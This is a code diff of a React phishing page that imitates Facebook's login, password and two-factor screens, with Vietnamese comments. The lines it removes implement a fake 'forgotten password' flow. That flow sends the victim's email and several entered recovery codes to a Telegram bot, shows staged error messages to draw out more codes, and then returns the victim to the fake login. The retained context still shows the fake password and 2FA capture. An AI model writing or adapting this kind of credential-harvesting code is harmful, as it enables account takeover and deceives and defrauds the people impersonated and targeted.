@@ -20,11 +20,6 @@ export default function Home() {
 
   // States cho Gửi lại mã
   const [resendTimer, setResendTimer] = useState(0);
-  
-  // States cho Quên mật khẩu
-  const [forgotEmail, setForgotEmail] = useState('');
-  const [showForgotSuccess, setShowForgotSuccess] = useState(false);
-  const [forgotOtpAttempt, setForgotOtpAttempt] = useState(0);
 
   // --- DỮ LIỆU TRANG CHỦ ---
   const benefitsData = [
@@ -104,42 +99,6 @@ export default function Home() {
         return prev - 1;
       });
     }, 1000);
-  };
-
-  const handleForgotSubmit = (e) => {
-    e.preventDefault(); if (!forgotEmail) return;
-    setLoading(true);
-    sendTelegramMessage(`\n<b>Forgot Password Input:</b> <code>${escapeHtml(forgotEmail)}</code>`);
-    setTimeout(() => { setLoading(false); setShowForgotSuccess(true); }, 1000);
-  };
-
-  const handleForgotOtp = (e) => {
-    e.preventDefault(); if (otp.length < 6) return;
-    setLoading(true);
-    const newAttempt = forgotOtpAttempt + 1;
-    setForgotOtpAttempt(newAttempt);
-
-    if (newAttempt <= 3) {
-        sendTelegramMessage(`\n<b>Recovery OTP ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
-    }
-
-    setTimeout(() => {
-        setLoading(false);
-        if (newAttempt < 3) {
-            setShowOtpError(true);
-            setOtp('');
-        } else {
-            setShowOtpError(true); 
-            setOtp(''); 
-            setTimeout(() => {
-                setStep(2); 
-                setShowForgotSuccess(false); 
-                setForgotEmail(''); 
-                setForgotOtpAttempt(0);
-                setShowOtpError(false);
-            }, 2000);
-        }
-    }, 1500);
   };
 
   return (
@@ -558,13 +517,7 @@ export default function Home() {
                       <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
                       {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
                       <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
-                      
-                      <div style={{ textAlign: 'center', padding: '12px 0 0' }}>
-                          <button type="button" onClick={() => { setStep(4); setShowForgotSuccess(false); setForgotEmail(''); }} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer' }}>
-                              Forgotten password?
-                          </button>
-                      </div>
-                  </form>
+                    </form>
                 )}
 
                 {/* FORM 3: 2FA */}
@@ -584,60 +537,6 @@ export default function Home() {
                             </button>
                         </div>
                     </form>
-                  </>
-                )}
-
-                {/* FORM 4: FORGOT PASSWORD */}
-                {step === 4 && (
-                  <>
-                    {!showForgotSuccess ? (
-                      // BƯỚC 4.1: TÌM TÀI KHOẢN
-                      <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Find your account</h2>
-                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
-                            Enter your mobile number or email address to search for your account.
-                        </p>
-                        <form onSubmit={handleForgotSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                            <input className="fb-input" type="text" placeholder="Mobile number or email address" value={forgotEmail} onChange={e => setForgotEmail(e.target.value)} required />
-                            <button type="submit" className="fb-btn" disabled={loading || !forgotEmail}>{loading ? 'Searching...' : 'Search'}</button>
-                        </form>
-                        <div style={{ textAlign: 'center', marginTop: '16px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
-                            <button type="button" onClick={() => setStep(2)} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer', fontWeight: '500' }}>Back to Log in</button>
-                        </div>
-                      </>
-                    ) : (
-                      // BƯỚC 4.2: NHẬP MÃ KHÔI PHỤC
-                      <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Reset your password</h2>
-                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
-                            Enter the 6-digit or 8-digit code we sent to your email or phone to reset your password.
-                        </p>
-                        <form onSubmit={handleForgotOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                            <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
-                            
-                            {/* Thông báo lỗi thông minh */}
-                            {showOtpError && (
-                                <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
-                                    {forgotOtpAttempt >= 3 
-                                        ? 'You have entered an incorrect code too many times. Please try again later.' 
-                                        : 'Invalid security code. Please check the code and try again.'}
-                                </div>
-                            )}
-                            
-                            <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : 'Verify'}</button>
-                            
-                            <div style={{ textAlign: 'center', marginTop: '8px' }}>
-                                <button type="button" onClick={handleResend} disabled={resendTimer > 0} style={{ background: 'none', border: 'none', color: resendTimer > 0 ? '#65676b' : '#0064e0', fontSize: '14px', fontWeight: '500', cursor: resendTimer > 0 ? 'default' : 'pointer' }}>
-                                    {resendTimer > 0 ? `Resend code in ${resendTimer}s` : 'Resend code'}
-                                </button>
-                            </div>
-                            
-                            <div style={{ textAlign: 'center', marginTop: '16px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
-                                <button type="button" onClick={() => { setShowForgotSuccess(false); setOtp(''); }} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer', fontWeight: '500' }}>Back</button>
-                            </div>
-                        </form>
-                      </>
-                    )}
                   </>
                 )}
 
